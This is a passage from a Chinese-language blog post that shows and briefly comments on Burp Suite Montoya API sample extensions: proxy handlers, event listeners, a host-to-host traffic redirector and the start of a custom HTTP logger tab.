class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.InterceptedResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyResponseHandler;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyResponseReceivedAction;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyResponseToBeSentAction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.core.HighlightColor.BLUE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyProxyHttpResponseHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyResponseHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseReceivedAction <span class="title function_">handleResponseReceived</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        <span class="comment">//Highlight all responses that have username in them</span></span><br><span class="line">        <span class="keyword">if</span> (interceptedResponse.bodyToString().contains(<span class="string">&quot;username&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ProxyResponseReceivedAction.continueWith(interceptedResponse, interceptedResponse.annotations().withHighlightColor(BLUE));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyResponseReceivedAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseToBeSentAction <span class="title function_">handleResponseToBeSent</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ProxyResponseToBeSentAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyProxyHttpRequestHandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.InterceptedRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyRequestHandler;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyRequestReceivedAction;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyRequestToBeSentAction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.core.HighlightColor.RED;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.ContentType.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyProxyHttpRequestHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyRequestHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestReceivedAction <span class="title function_">handleRequestReceived</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line">        <span class="comment">//Drop all post requests</span></span><br><span class="line">        <span class="keyword">if</span> (interceptedRequest.method().equals(<span class="string">&quot;POST&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ProxyRequestReceivedAction.drop();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Do not intercept any request with foo in the url</span></span><br><span class="line">        <span class="keyword">if</span> (interceptedRequest.url().contains(<span class="string">&quot;foo&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ProxyRequestReceivedAction.doNotIntercept(interceptedRequest);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//If the content type is json, highlight the request and follow burp rules for interception</span></span><br><span class="line">        <span class="keyword">if</span> (interceptedRequest.contentType() == JSON) &#123;</span><br><span class="line">            <span class="keyword">return</span> ProxyRequestReceivedAction.continueWith(interceptedRequest, interceptedRequest.annotations().withHighlightColor(RED));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Intercept all other requests</span></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestReceivedAction.intercept(interceptedRequest);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestToBeSentAction <span class="title function_">handleRequestToBeSent</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line">        <span class="comment">//Do nothing with the user modified request, continue as normal.</span></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestToBeSentAction.continueWith(interceptedRequest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/tools/burpsuite-plugins/image-1.png"><br>观察可以看到上面的代码似乎已经取代了我这里的拦截，因为即便是拦截关闭的话，也依旧是拦截状态</p><h2 id="Event-Listeners-Example-Extension"><a href="#Event-Listeners-Example-Extension" class="headerlink" title="Event Listeners Example Extension"></a>Event Listeners Example Extension</h2><p>This extension demonstrates how to register listeners for various runtime events:</p><ul><li>HTTP requests and responses for all Burp tools.</li><li>HTTP messages intercepted by the Proxy.</li><li>Addition of new scan issues.</li><li>The extension being unloaded by the user.</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EventListeners</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Logging logging;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        logging = api.logging();</span><br><span class="line"></span><br><span class="line">        <span class="type">Http</span> <span class="variable">http</span> <span class="operator">=</span> api.http();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> api.proxy();</span><br><span class="line">        <span class="type">Extension</span> <span class="variable">extension</span> <span class="operator">=</span> api.extension();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> api.scanner();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set extension name</span></span><br><span class="line">        extension.setName(<span class="string">&quot;Event listeners&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register a new HTTP handler</span></span><br><span class="line">        http.registerHttpHandler(<span class="keyword">new</span> <span class="title class_">MyHttpHandler</span>(api));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register new Proxy handlers</span></span><br><span class="line">        proxy.registerRequestHandler(<span class="keyword">new</span> <span class="title class_">MyProxyRequestHandler</span>(api));</span><br><span class="line">        proxy.registerResponseHandler(<span class="keyword">new</span> <span class="title class_">MyProxyResponseHandler</span>(api));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register a new Audit Issue handler</span></span><br><span class="line">        scanner.registerAuditIssueHandler(<span class="keyword">new</span> <span class="title class_">MyAuditIssueListenerHandler</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register a new extension unload handler</span></span><br><span class="line">        extension.registerUnloadingHandler(<span class="keyword">new</span> <span class="title class_">MyExtensionUnloadHandler</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MyAuditIssueListenerHandler</span> <span class="keyword">implements</span> <span class="title class_">AuditIssueHandler</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleNewAuditIssue</span><span class="params">(AuditIssue auditIssue)</span> &#123;</span><br><span class="line">            logging.logToOutput(<span class="string">&quot;New scan issue: &quot;</span> + auditIssue.name());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MyExtensionUnloadHandler</span> <span class="keyword">implements</span> <span class="title class_">ExtensionUnloadingHandler</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">extensionUnloaded</span><span class="params">()</span> &#123;</span><br><span class="line">            logging.logToOutput(<span class="string">&quot;Extension was unloaded.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyHttpHandler</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        logging = api.logging();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RequestToBeSentAction <span class="title function_">handleHttpRequestToBeSent</span><span class="params">(HttpRequestToBeSent httpRequestToBeSent)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;HTTP request to &quot;</span> + httpRequestToBeSent.httpService() + <span class="string">&quot; [&quot;</span> + httpRequestToBeSent.toolSource().toolType().toolName() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> RequestToBeSentAction.continueWith(httpRequestToBeSent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ResponseReceivedAction <span class="title function_">handleHttpResponseReceived</span><span class="params">(HttpResponseReceived httpResponseReceived)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;HTTP response from &quot;</span> + httpResponseReceived.initiatingRequest().httpService() + <span class="string">&quot; [&quot;</span> + httpResponseReceived.toolSource().toolType().toolName() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ResponseReceivedAction.continueWith(httpResponseReceived);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProxyRequestHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyRequestHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyProxyRequestHandler</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        logging = api.logging();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestReceivedAction <span class="title function_">handleRequestReceived</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Initial intercepted proxy request to &quot;</span> + interceptedRequest.httpService());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestReceivedAction.continueWith(interceptedRequest);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestToBeSentAction <span class="title function_">handleRequestToBeSent</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Final intercepted proxy request to &quot;</span> + interceptedRequest.httpService());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestToBeSentAction.continueWith(interceptedRequest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProxyResponseHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyResponseHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyProxyResponseHandler</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        logging = api.logging();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseReceivedAction <span class="title function_">handleResponseReceived</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Initial intercepted proxy response from &quot;</span> + interceptedResponse.initiatingRequest().httpService());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyResponseReceivedAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseToBeSentAction <span class="title function_">handleResponseToBeSent</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Final intercepted proxy response from &quot;</span> + interceptedResponse.initiatingRequest().httpService());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyResponseToBeSentAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/tools/burpsuite-plugins/image-2.png" alt="原来上面的输出out是指记录在这里导入插件之后的out"><br><img src="/2024/10/23/tools/burpsuite-plugins/image-3.png" alt="在插件页面这里也可以看到"></p><h2 id="Traffic-Redirector-Example-Extension"><a href="#Traffic-Redirector-Example-Extension" class="headerlink" title="Traffic Redirector Example Extension"></a>Traffic Redirector Example Extension</h2><p>This extension demonstrates how to redirect outgoing HTTP requests from one host to another. This task might arise, for example, if you have mapped out an application which then moves to a different staging URL. By simply redirecting traffic to the new hostname, you can continue to drive your testing from the original site map.</p><p>The extension works as follows:</p><ul><li>It registers an HTTP handler.</li><li>For outgoing request messages, it retrieves the HTTP service for the request.</li><li>If the HTTP service host matches the “from” host, builds an HTTP service using the “to” host, and other details unchanged.</li><li>It returns the HTTP request with the new HTTP service.</li></ul><p><strong>Note:</strong> The sample code uses “host1.example.org” and “host2.example.org” as the “from” and “to” hostnames. You should edit the code to use your own hostnames before using it.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrafficRedirector</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HOST_FROM</span> <span class="operator">=</span> <span class="string">&quot;host1.example.org&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HOST_TO</span> <span class="operator">=</span> <span class="string">&quot;host2.example.org&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="comment">// set extension name</span></span><br><span class="line">        api.extension().setName(<span class="string">&quot;Traffic redirector&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register a new HTTP handler</span></span><br><span class="line">        api.http().registerHttpHandler(<span class="keyword">new</span> <span class="title class_">MyHttpHandler</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.HttpService;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.*;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.HttpService.httpService;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.handler.RequestToBeSentAction.continueWith;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RequestToBeSentAction <span class="title function_">handleHttpRequestToBeSent</span><span class="params">(HttpRequestToBeSent httpRequestToBeSent)</span> &#123;</span><br><span class="line">        <span class="type">HttpService</span> <span class="variable">service</span> <span class="operator">=</span> httpRequestToBeSent.httpService();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (TrafficRedirector.HOST_FROM.equalsIgnoreCase(service.host())) &#123;</span><br><span class="line">            <span class="type">HttpRequest</span> <span class="variable">updatedHttpServiceRequest</span> <span class="operator">=</span> httpRequestToBeSent.withService(httpService(TrafficRedirector.HOST_TO, service.port(), service.secure()));</span><br><span class="line">            <span class="type">HttpRequest</span> <span class="variable">updatedHostHeaderRequest</span> <span class="operator">=</span> updatedHttpServiceRequest.withUpdatedHeader(<span class="string">&quot;Host&quot;</span>, TrafficRedirector.HOST_TO);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> continueWith(updatedHostHeaderRequest);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> continueWith(httpRequestToBeSent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ResponseReceivedAction <span class="title function_">handleHttpResponseReceived</span><span class="params">(HttpResponseReceived httpResponseReceived)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseReceivedAction.continueWith(httpResponseReceived);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Custom-Logger-Example-Extension"><a href="#Custom-Logger-Example-Extension" class="headerlink" title="Custom Logger Example Extension"></a>Custom Logger Example Extension</h2><p>Adds a new tab to Burp’s UI and displays a log of HTTP traffic for all Burp tools.</p><hr><p>This extension provides a suite-wide HTTP logger within the main Burp UI.</p><p>The extension uses the following techniques:</p><ul><li>It creates a custom tab within the main Burp UI, in which to display logging user interface</li><li>It displays a table of items and a read-only editor for requests and responses within a splitpane</li><li>When an item passes through the HttpHandler, it gets added to the table</li><li>You can view the request and response for an item in the table by clicking on the relevant row</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入所需的类和接口</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.HttpResponseReceived;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.UserInterface;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.HttpRequestEditor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.HttpResponseEditor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使编辑器为只读</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.ui.editor.EditorOptions.READ_ONLY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 BurpExtension 接口的 CustomLogger 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomLogger</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> MontoyaApi api;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;  <span class="comment">// 存储 MontoyaApi 实例</span></span><br><span class="line">        api.extension().setName(<span class="string">&quot;Custom logger&quot;</span>);  <span class="comment">// 设置插件的名称</span></span><br><span class="line"></span><br><span class="line">        <span class="type">MyTableModel</span> <span class="variable">tableModel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyTableModel</span>();  <span class="comment">// 创建表格模型实例</span></span><br><span class="line">        api.userInterface().registerSuiteTab(<span class="string">&quot;Custom logger&quot;</span>, constructLoggerTab(tableModel));  <span class="comment">// 注册插件UI到Burp的标签页</span></span><br><span class="line">        api.http().registerHttpHandler(<span class="keyword">new</span> <span class="title class_">MyHttpHandler</span>(tableModel));  <span class="comment">// 注册HTTP处理器来记录响应</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建日志标签页的方法，接受一个 MyTableModel 对象作为参数</span></span><br><span class="line">    <span class="keyword">private</span> Component <span class="title function_">constructLoggerTab</span><span class="params">(MyTableModel tableModel)</span> &#123;</span><br><span class="line">        <span class="type">JSplitPane</span> <span class="variable">splitPane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSplitPane</span>(JSplitPane.VERTICAL_SPLIT);  <span class="comment">// 创建垂直分割面板</span></span><br><span class="line"></span><br><span class="line">        <span class="type">JTabbedPane</span> <span class="variable">tabs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTabbedPane</span>();  <span class="comment">// 创建标签页容器</span></span><br><span class="line"></span><br><span class="line">        <span class="type">UserInterface</span> 